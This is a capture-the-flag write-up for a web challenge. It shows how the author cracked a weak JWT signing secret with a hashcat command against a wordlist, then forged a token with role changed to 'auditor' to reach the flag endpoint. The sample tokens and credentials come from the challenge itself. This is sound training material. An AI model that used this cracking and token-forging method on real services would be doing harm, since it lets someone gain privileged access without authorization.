+++
title = 'Portal Tech Breach - Step 1: JWT Forge'
description = "A new internal audit portal has just been deployed at Portal-Tech. The dev team claims access to sensitive data is strictly restricted to authorized auditors — prove them wrong."
category = 'Web'
solved = true
+++

| Info        	|                           	|
|-------------	|---------------------------	|
| Category    	| {{< category >}}             	|
| Description 	| {{< desc >}}              	|
| Flag        	| `HF-{JWT_S3cr3t_Cr4ck3d}` 	|

> [!note]+ Rest of the description
> A regular employee account is provided as your starting point: • Username: `jdupont` • Password: `Summer2024!`. No auditor account exists - that access level must be obtained another way. Step 1 – Escalate privileges: the JWT signing secret is weak. Crack it offline and forge a token with role=auditor. Log in via `POST /login` to get a JWT. Regular accounts only get role: employee — but there's no "auditor" account to log in with... so you'll have to make your own.

> [!CAUTION] TL;DR
> The signing key of the JWT is weak.
It can be found easily.
The role in the payload can be changed and the token reforged to get the flag through the API path.

## Summary

I logged in as the given user, copied the JWT and cracked the signing key using Hashcat with the JWT mode.
Then, I forged a new token with the `auditor` role and found the flag.

## Initial Recon

> [!WARNING]+
> Missing details, lack of notes.

The challenge provided an API only, no web pages.
There was a `/login` endpoint, a `/dashboard` endpoint that was needed to escalate the role, and then a `/auditor/flag` endpoint to get the flag.

## Solution

> The steps were really just indicated in the description of the challenge.

1. **Login with the provided user** and get the JWT.

    Got the following token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqZHVwb250Iiwicm9sZSI6ImVtcGxveWVlIiwiZXhwIjoxNzkzMzM5Mjg3fQ.tffzysM3pg2dwOUl2TuNGqwZI7q9gXPCy5g9vvtCTb` for user `jdupont` with password `Summer2024!`.

2. **Crack the signing key** with Hashcat.

    ```console { class="no-linenos" }
    $ hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt.gz
    ```
    I pasted the token in a file called `jwt.txt`.
    The `-m 16500` signifies mode JWT.
    It tells Hashcat to crack a web token.

    The signing key was `password`... Really weak!

3. **Forge a new token** by changing the role to `auditor`.

    The new token:
    ```json
    {
      "alg": "HS256",
      "typ": "JWT"
    }
    {
      "sub": "jdupont",
      "role": "auditor",
      "exp": 1793339287
    }
    password
    ```
    `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqZHVwb250Iiwicm9sZSI6ImF1ZGl0b3IiLCJleHAiOjE3OTMzMzkyODd9.xlhbFon7Dogrx5BniMoIQfB0Pkj8QPwa97QB00m4Wso`

4. **Get the flag**

    Add the new token in the `Authorization` header as `Bearer <token>` and connect to `dashboard`.
    Then, get the flag at `/auditor/flag`.

## Takeaways

### Vulnerability

- You can brute-force the signing key of JWT and then forge a new one with better privileges.
- This is a fundamental limitation of relying on the JWT's integrity.

### Methodology

- Take better notes to write the writeup in better details.
